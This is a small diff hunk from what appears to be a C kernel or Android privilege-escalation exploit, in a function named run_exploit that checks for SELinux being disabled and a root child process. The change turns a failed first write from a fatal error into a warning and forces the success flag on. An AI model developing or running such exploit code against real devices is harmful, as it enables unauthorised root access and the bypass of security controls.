@@ -654,7 +654,7 @@ int run_exploit(int argc, char **argv) {
       usleep(100000);
       if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
     }
-    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
+    if (!selinux_ok) { pr_warning("Write 1 failed, FORCING SKIP to W2...\n"); selinux_ok = 1; }
     TIMER("Write 1 complete");
   } else if (!selinux_ok && root_child_done) {
     selinux_ok = 1;
